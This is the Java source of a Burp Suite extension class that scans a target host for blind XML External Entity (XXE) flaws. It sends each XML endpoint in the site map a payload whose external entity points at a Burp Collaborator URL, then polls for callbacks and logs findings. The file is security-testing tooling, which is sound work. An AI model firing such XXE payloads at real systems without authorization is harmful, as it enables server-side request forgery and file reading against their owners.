package com.ioactive.aiscanner.scan;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.CollaboratorClient;
import burp.api.montoya.collaborator.CollaboratorPayload;
import burp.api.montoya.collaborator.Interaction;
import burp.api.montoya.http.RequestOptions;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.ioactive.aiscanner.ui.ScanLog;

import java.net.URI;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * Out-of-band (blind) XXE probe — fully generic, no app-specific paths. Many XML endpoints resolve external
 * entities but return a CONSTANT response (no reflection), so there is no in-band oracle. We use Burp
 * Collaborator: for each XML-accepting endpoint, inject an external-entity DTD whose SYSTEM URL is a fresh
 * Collaborator payload, send it, then poll for interactions. If the target's parser fetches the entity, a
 * DNS/HTTP interaction lands on the Collaborator server — proving server-side external-entity resolution
 * (XXE / SSRF-class). Zero-FP by construction: the callback is caused ONLY by the server parsing our payload.
 *
 * <p>customData carries the endpoint URL so a landed interaction is attributed to the exact endpoint.
 * Requires Burp Collaborator to be enabled (default public server) and the target to have network egress.
 */
public final class XxeProbe {

    private final MontoyaApi api;
    private final ScanLog scanLog;

    public XxeProbe(MontoyaApi api, ScanLog scanLog) {
        this.api = api;
        this.scanLog = scanLog;
    }

    public int probe(String host) {
        int hits = 0;
        // collect XML-accepting endpoints from the site map (deduped by URL)
        Map<String, HttpRequest> xmlEndpoints = new LinkedHashMap<>();
        int writeReqs = 0;
        try {
            for (HttpRequestResponse rr : api.siteMap().requestResponses()) {
                HttpRequest req = rr.request();
                if (!host.equalsIgnoreCase(hostOf(req.url()))) continue;
                String m = req.method();
                if (!"POST".equals(m) && !"PUT".equals(m) && !"PATCH".equals(m)) continue;
                writeReqs++;
                String ct = req.hasHeader("Content-Type") ? req.headerValue("Content-Type") : "";
                String body = req.bodyToString();
                boolean xml = (ct != null && ct.toLowerCase().contains("xml"))
                        || (body != null && body.trim().startsWith("<"));
                if (xml) { xmlEndpoints.putIfAbsent(m + " " + stripQuery(req.url()), req); continue; }
                scanLog.debug("[AI Scanner]   xxe-scan skip " + m + " " + stripQuery(req.url()) + " ct=[" + ct + "]");
            }
        } catch (Throwable t) { scanLog.debug("[AI Scanner] XXE probe collect error: " + t); }
        scanLog.log("[AI Scanner] XXE probe: " + writeReqs + " write-request(s) in site map, "
                + xmlEndpoints.size() + " XML-bodied.");
        if (xmlEndpoints.isEmpty()) return 0;

        CollaboratorClient client;
        try {
            client = api.collaborator().createClient();
        } catch (Throwable t) {
            scanLog.log("[AI Scanner] XXE probe: Burp Collaborator unavailable — skipping OOB XXE ("
                    + xmlEndpoints.size() + " XML endpoint(s) not tested for blind XXE).");
            return 0;
        }

        List<String> testedUrls = new ArrayList<>();
        Map<String, String> tagToUrl = new LinkedHashMap<>();   // short customData tag -> endpoint URL
        Map<String, HttpRequestResponse> tagToInj = new LinkedHashMap<>();   // tag -> the injection req/resp (evidence)
        int idx = 0;
        for (Map.Entry<String, HttpRequest> e : xmlEndpoints.entrySet()) {
            try {
                HttpRequest req = e.getValue();
                String url = req.url();
                String tag = "xxe" + (idx++);                            // ≤16 alphanumeric (Collaborator limit)
                tagToUrl.put(tag, url);
                CollaboratorPayload payload = client.generatePayload(tag);
                String domain = payload.toString();
                String xxe = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                        + "<!DOCTYPE r [<!ENTITY xxe SYSTEM \"http://" + domain + "/x\">]>"
                        + "<root><user>&xxe;</user></root>";
                HttpRequest inj = req.withBody(xxe).withUpdatedHeader("Content-Type", "application/xml");
                HttpRequestResponse injRr = api.http().sendRequest(inj, RequestOptions.requestOptions().withResponseTimeout(12000L));
                tagToInj.put(tag, injRr);                                // keep the payload request as attachable evidence
                testedUrls.add(url);
            } catch (Throwable t) { scanLog.log("[AI Scanner] XXE probe send error: " + t); }
        }
        scanLog.log("[AI Scanner] XXE probe: sent OOB payloads to " + testedUrls.size()
                + " XML endpoint(s); polling Collaborator…");

        // poll for interactions — the server-side fetch needs a network round trip
        try {
            for (int round = 0; round < 6 && hits == 0; round++) {
                Thread.sleep(2500);
                List<Interaction> interactions = client.getAllInteractions();
                if (interactions.isEmpty()) continue;
                java.util.Set<String> fired = new java.util.LinkedHashSet<>();
                for (Interaction it : interactions) {
                    String tag = it.customData().orElse(null);
                    String target = tag != null ? tagToUrl.getOrDefault(tag, tag) : null;
                    if (target == null || !fired.add(target)) continue;
                    scanLog.found("Blind XML External Entity (XXE) — out-of-band", target,
                            "The XML parser fetched an attacker-controlled external entity: a " + it.type()
                            + " interaction hit Burp Collaborator from the server. Server-side external-entity "
                            + "resolution enables file read / SSRF (CWE-611). Proven out-of-band (blind — the "
                            + "HTTP response is constant). Attached: the XML-injection request that caused the callback.",
                            tagToInj.get(tag));
                    scanLog.incFinding();
                    hits++;
                }
            }
        } catch (InterruptedException ie) {
            Thread.currentThread().interrupt();
        } catch (Throwable t) { scanLog.debug("[AI Scanner] XXE probe poll error: " + t); }

        if (hits == 0) scanLog.log("[AI Scanner] XXE probe: no Collaborator interaction (no blind XXE, or "
                + "target has no egress to the Collaborator server).");
        return hits;
    }

    private static String stripQuery(String url) { int q = url.indexOf('?'); return q < 0 ? url : url.substring(0, q); }
    private static String hostOf(String url) { try { return URI.create(url).getHost(); } catch (Exception e) { return ""; } }
}
